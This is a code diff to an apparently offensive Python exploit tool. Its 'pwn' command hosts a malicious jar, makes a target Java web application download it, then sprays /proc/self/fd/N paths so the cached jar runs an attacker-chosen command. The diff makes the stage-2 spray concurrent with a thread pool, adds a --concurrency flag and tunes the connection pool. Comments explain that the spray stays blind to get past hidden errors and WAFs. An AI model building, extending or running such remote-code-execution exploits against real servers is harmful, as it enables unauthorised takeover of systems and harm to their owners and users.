@@ -48,6 +48,7 @@ import struct
 import sys
 import threading
 import time
+from concurrent.futures import ThreadPoolExecutor
 from http.server import BaseHTTPRequestHandler
 from urllib.parse import urlparse
 
@@ -702,6 +703,12 @@ def run_pwn(cfg) -> int:
     print(f"{green('[+]')} hosting jar on 0.0.0.0:{cfg['lport']} (any path returns this jar)")
 
     session = requests.Session()
+    # Size the connection pool to the spray concurrency so stage-2 threads reuse sockets instead of
+    # exhausting the default pool (which would serialize them and print urllib3 pool-full warnings).
+    pool = max(1, cfg["concurrency"])
+    adapter = requests.adapters.HTTPAdapter(pool_connections=pool, pool_maxsize=pool)
+    session.mount("http://", adapter)
+    session.mount("https://", adapter)
     timeout = cfg["timeout"]
     try:
         # ---------- stage 1: trigger the download ----------
@@ -723,19 +730,33 @@ def run_pwn(cfg) -> int:
         # the command runs but the returned object is not the expected bean and errors out. So this is a blind
         # spray whose result must be verified out of band.
         lo, hi = cfg["fd_low"], cfg["fd_high"]
-        print(f"{cyan('[*]')} STAGE 2 -> spraying fd [{lo},{hi}) blindly "
+        total = hi - lo
+        workers = max(1, cfg["concurrency"])
+        print(f"{cyan('[*]')} STAGE 2 -> spraying fd [{lo},{hi}) blindly with {workers} concurrent workers "
               f"(the downloaded jar is cached at some /proc/self/fd/N; hitting it defines+instantiates "
               f"the malicious class -> runs the command)")
-        total = hi - lo
-        for i, n in enumerate(range(lo, hi), 1):
+        # The spray is intentionally blind: because a hit cannot be told apart from a miss on every
+        # target (many apps hide the exception, return a generic error page, or sit behind a WAF), we
+        # do not parse responses to stop early. The fd probes are independent, so we just fire the whole
+        # range concurrently to cut wall-clock time; hitting the cached fd runs the command regardless.
+        done = 0
+        lock = threading.Lock()
+
+        def spray_one(n):
+            nonlocal done
             file_dot = dot_type(file_internal(cfg["entry"], n))
             try:
                 http_post(session, url, build_body(file_dot, cfg["ghost"]), cfg["headers"], timeout, None)
             except requests.RequestException:
-                continue
+                pass
             if USE_COLOR:
-                sys.stdout.write(f"\r{cyan('[*]')} spraying fd {n}  ({i}/{total})   ")
-                sys.stdout.flush()
+                with lock:
+                    done += 1
+                    sys.stdout.write(f"\r{cyan('[*]')} sprayed {done}/{total} fd requests   ")
+                    sys.stdout.flush()
+
+        with ThreadPoolExecutor(max_workers=workers) as ex:
+            list(ex.map(spray_one, range(lo, hi)))
         if USE_COLOR:
             sys.stdout.write("\n")
         print(f"{green('[+]')} STAGE 2 done: sprayed stage-2 requests over fd [{lo},{hi}); "
@@ -785,12 +806,15 @@ def cmd_pwn(args) -> int:
     if args.fd_low < 0 or args.fd_high <= args.fd_low:
         print(f"{red('error:')} invalid fd range: [{args.fd_low},{args.fd_high})", file=sys.stderr)
         return 2
+    if args.concurrency < 1:
+        print(f"{red('error:')} --concurrency must be >= 1", file=sys.stderr)
+        return 2
     cfg = {
         "target": args.target, "lhost": args.lhost,
         "lport": args.lport, "name": args.name, "entry": args.entry, "cmd": args.cmd,
         "ghost": args.ghost, "headers": headers,
         "fd_low": args.fd_low, "fd_high": args.fd_high, "timeout": args.timeout,
-        "verbose": args.verbose,
+        "concurrency": args.concurrency, "verbose": args.verbose,
     }
     return run_pwn(cfg)
 
@@ -830,6 +854,8 @@ def build_parser() -> argparse.ArgumentParser:
     w.add_argument("--fd-low", type=int, default=10, dest="fd_low", help="fd spray lower bound (default 10)")
     w.add_argument("--fd-high", type=int, default=300, dest="fd_high",
                    help="fd spray upper bound, exclusive (default 300)")
+    w.add_argument("--concurrency", type=int, default=16, dest="concurrency",
+                   help="number of concurrent stage-2 spray requests (default 16)")
     w.add_argument("--timeout", type=parse_duration, default="8s", metavar="DURATION",
                    help="per-request HTTP timeout (default 8s)")
     w.add_argument("-v", "--verbose", action="store_true", help="print jar-fetch and extra logs")
